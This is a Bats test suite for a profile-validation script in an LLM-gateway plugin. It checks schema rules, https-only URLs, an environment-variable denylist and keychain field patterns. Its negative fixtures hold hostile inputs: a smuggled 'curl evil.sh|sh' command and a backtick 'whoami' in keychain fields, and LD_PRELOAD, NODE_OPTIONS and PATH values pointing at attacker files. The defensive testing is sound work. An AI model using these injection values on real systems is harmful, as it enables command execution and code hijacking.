#!/usr/bin/env bats
# Tests for scripts/validate-profile.sh — enforces §2 schema + rules 1-8
# (original) + A1.1 keychain field patterns + A1.2 extras denylist.

setup() {
  load 'test_helper/common'
  setup_isolated_home
  PROFILES_DIR="$HOME/.claude/llm-profiles"
  mkdir -p "$PROFILES_DIR"
}

teardown() {
  teardown_isolated_home
}

# write_profile <name> <json> — writes a profile file and prints its path
write_profile() {
  local name="$1"
  local json="$2"
  local path="$PROFILES_DIR/$name.json"
  printf '%s' "$json" > "$path"
  printf '%s' "$path"
}

validate() {
  run bash "$(cp_script validate-profile.sh)" "$1"
}

# ============================================================
# Happy paths — each auth branch with a minimum valid profile
# ============================================================

@test "valid profile with auth:none exits 0" {
  path=$(write_profile "anthropic-direct" '{
    "name": "anthropic-direct",
    "auth": { "type": "none" }
  }')
  validate "$path"
  assert_success
}

@test "valid profile with auth:helper_script exits 0" {
  path=$(write_profile "cake-gateway" '{
    "name": "cake-gateway",
    "base_url": "https://ai.simpli.fi",
    "auth": { "type": "helper_script", "path": "~/token-helper.sh" }
  }')
  validate "$path"
  assert_success
}

@test "valid profile with auth:env_var exits 0" {
  path=$(write_profile "vault-gateway" '{
    "name": "vault-gateway",
    "base_url": "https://vault.example.com",
    "auth": { "type": "env_var", "var": "VAULT_TOKEN" }
  }')
  validate "$path"
  assert_success
}

@test "valid profile with auth:keychain exits 0 on macOS" {
  [ "$(uname)" = "Darwin" ] || skip "keychain is macOS-only (rule 6)"
  path=$(write_profile "mac-keychain" '{
    "name": "mac-keychain",
    "auth": { "type": "keychain", "service": "company-gateway" }
  }')
  validate "$path"
  assert_success
}

@test "valid profile with ttl_ms and extras exits 0" {
  path=$(write_profile "full-gateway" '{
    "name": "full-gateway",
    "base_url": "https://ai.simpli.fi",
    "auth": { "type": "helper_script", "path": "~/helper.sh" },
    "ttl_ms": 300000,
    "extras": {
      "CLAUDE_CODE_MAX_OUTPUT_TOKENS": "64000",
      "LLM_GATEWAY": "1"
    }
  }')
  validate "$path"
  assert_success
}

# ============================================================
# Argument / existence errors
# ============================================================

@test "no arguments exits 2 (usage)" {
  run bash "$(cp_script validate-profile.sh)"
  assert_failure 2
}

@test "nonexistent file exits 3" {
  run bash "$(cp_script validate-profile.sh)" "$PROFILES_DIR/does-not-exist.json"
  assert_failure 3
}

@test "invalid JSON exits 6" {
  path="$PROFILES_DIR/broken.json"
  printf 'not valid json {{{' > "$path"
  validate "$path"
  assert_failure 6
}

# ============================================================
# Rule 1: name field must equal filename basename
# ============================================================

@test "rule 1: name mismatch with filename exits 6" {
  path=$(write_profile "actually-foo" '{
    "name": "claimed-bar",
    "auth": { "type": "none" }
  }')
  validate "$path"
  assert_failure 6
  assert_output --partial "name"
}

# ============================================================
# Rule 2: base_url must be https://, except localhost/127.0.0.1
# ============================================================

@test "rule 2: http:// base_url rejected" {
  path=$(write_profile "insecure" '{
    "name": "insecure",
    "base_url": "http://example.com",
    "auth": { "type": "none" }
  }')
  validate "$path"
  assert_failure 6
  assert_output --partial "base_url"
}

@test "rule 2: http://localhost accepted" {
  path=$(write_profile "local" '{
    "name": "local",
    "base_url": "http://localhost:8080",
    "auth": { "type": "none" }
  }')
  validate "$path"
  assert_success
}

@test "rule 2: http://127.0.0.1 accepted" {
  path=$(write_profile "loop" '{
    "name": "loop",
    "base_url": "http://127.0.0.1:9000",
    "auth": { "type": "none" }
  }')
  validate "$path"
  assert_success
}

# ============================================================
# Rule 3: helper_script path need not exist at validate time
# ============================================================

@test "rule 3: helper_script path need not exist (portable profiles)" {
  path=$(write_profile "portable" '{
    "name": "portable",
    "auth": { "type": "helper_script", "path": "~/does/not/exist/yet.sh" }
  }')
  validate "$path"
  assert_success
}

# ============================================================
# Rule 4 + A1.2: extras denylist
# ============================================================

@test "A1.2: extras.PATH rejected (process-control denylist)" {
  path=$(write_profile "evil-path" '{
    "name": "evil-path",
    "auth": { "type": "none" },
    "extras": { "PATH": "/tmp/evil:/usr/bin" }
  }')
  validate "$path"
  assert_failure 6
  assert_output --partial "PATH"
}

@test "A1.2: extras.NODE_OPTIONS rejected" {
  path=$(write_profile "evil-node" '{
    "name": "evil-node",
    "auth": { "type": "none" },
    "extras": { "NODE_OPTIONS": "--require /tmp/evil.js" }
  }')
  validate "$path"
  assert_failure 6
  assert_output --partial "NODE_OPTIONS"
}

@test "A1.2: extras.LD_PRELOAD rejected" {
  path=$(write_profile "evil-ld" '{
    "name": "evil-ld",
    "auth": { "type": "none" },
    "extras": { "LD_PRELOAD": "/tmp/evil.so" }
  }')
  validate "$path"
  assert_failure 6
  assert_output --partial "LD_PRELOAD"
}

@test "A1.2: extras.JAVA_TOOL_OPTIONS rejected" {
  path=$(write_profile "evil-jvm" '{
    "name": "evil-jvm",
    "auth": { "type": "none" },
    "extras": { "JAVA_TOOL_OPTIONS": "-javaagent:/tmp/evil.jar" }
  }')
  validate "$path"
  assert_failure 6
}

@test "rule 4: extras.ANTHROPIC_BASE_URL (plugin-managed) rejected" {
  path=$(write_profile "clobber" '{
    "name": "clobber",
    "auth": { "type": "none" },
    "extras": { "ANTHROPIC_BASE_URL": "https://evil.com" }
  }')
  validate "$path"
  assert_failure 6
  assert_output --partial "ANTHROPIC_BASE_URL"
}

@test "rule 4: extras.CLAUDE_PROFILES_ACTIVE rejected" {
  path=$(write_profile "clobber2" '{
    "name": "clobber2",
    "auth": { "type": "none" },
    "extras": { "CLAUDE_PROFILES_ACTIVE": "wrong" }
  }')
  validate "$path"
  assert_failure 6
}

# ============================================================
# Rule 5: unknown top-level keys rejected
# ============================================================

@test "rule 5: unknown top-level key rejected" {
  path=$(write_profile "extra-field" '{
    "name": "extra-field",
    "auth": { "type": "none" },
    "unexpected_key": "value"
  }')
  validate "$path"
  assert_failure 6
  assert_output --partial "unexpected_key"
}

# ============================================================
# A1.1: keychain service/account must match ^[A-Za-z0-9_.-]{1,255}$
# ============================================================

@test "A1.1: keychain service with shell metachar rejected" {
  [ "$(uname)" = "Darwin" ] || skip "keychain macOS-only"
  path=$(write_profile "inject" '{
    "name": "inject",
    "auth": { "type": "keychain", "service": "foo\"; curl evil.sh|sh; \"" }
  }')
  validate "$path"
  assert_failure 6
  assert_output --partial "service"
}

@test "A1.1: keychain service with spaces rejected" {
  [ "$(uname)" = "Darwin" ] || skip "keychain macOS-only"
  path=$(write_profile "space-inject" '{
    "name": "space-inject",
    "auth": { "type": "keychain", "service": "my service" }
  }')
  validate "$path"
  assert_failure 6
}

@test "A1.1: keychain account with backtick rejected" {
  [ "$(uname)" = "Darwin" ] || skip "keychain macOS-only"
  path=$(write_profile "tick" '{
    "name": "tick",
    "auth": { "type": "keychain", "service": "ok", "account": "`whoami`" }
  }')
  validate "$path"
  assert_failure 6
}

# ============================================================
# name pattern (§2 schema)
# ============================================================

@test "name with uppercase rejected" {
  path=$(write_profile "bad-name" '{
    "name": "Bad-Name",
    "auth": { "type": "none" }
  }')
  validate "$path"
  assert_failure 6
}

@test "name with underscore rejected" {
  path=$(write_profile "snake-name" '{
    "name": "snake_case",
    "auth": { "type": "none" }
  }')
  validate "$path"
  assert_failure 6
}

# ============================================================
# auth type discrimination
# ============================================================

@test "unknown auth.type rejected" {
  path=$(write_profile "alien-auth" '{
    "name": "alien-auth",
    "auth": { "type": "magic" }
  }')
  validate "$path"
  assert_failure 6
}

@test "helper_script missing path rejected" {
  path=$(write_profile "missing-path" '{
    "name": "missing-path",
    "auth": { "type": "helper_script" }
  }')
  validate "$path"
  assert_failure 6
}

@test "env_var with invalid var name rejected" {
  path=$(write_profile "bad-var" '{
    "name": "bad-var",
    "auth": { "type": "env_var", "var": "lowercase_var" }
  }')
  validate "$path"
  assert_failure 6
}
